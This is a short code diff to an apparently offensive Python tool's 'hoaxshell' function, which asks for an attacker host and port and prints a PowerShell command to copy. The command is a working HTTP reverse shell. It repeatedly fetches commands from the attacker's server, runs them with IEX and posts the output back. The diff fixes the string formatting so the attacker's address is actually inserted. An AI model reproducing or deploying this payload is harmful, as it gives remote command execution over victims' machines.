@@ -73,13 +73,14 @@ def hoaxshell():
                 
         if select == "4" or select == "3":
             LHOST = input("ENTER THE LHOST : ")
-            PORT = input("[+] ENTER THE PORT : ")
+            PORT = input("[+] ENTER THE PORT: ")
 
             print(TextColors.GREEN + "[+] COPY THIS : "+ TextColors.ESET)
 
-            cmd_command = r"""
-            $s='LHOST:PORT';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
+            cmd_command = f"""
+            $s='{LHOST}:{PORT}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{{"Authorization"=$i}};while ($true){{$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{{"Authorization"=$i}});if ($c -ne 'None') {{$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{{"Authorization"=$i}} -Body ($e+$r)}}; sleep 0.8}}
             """
+
 
             print(cmd_command)
 
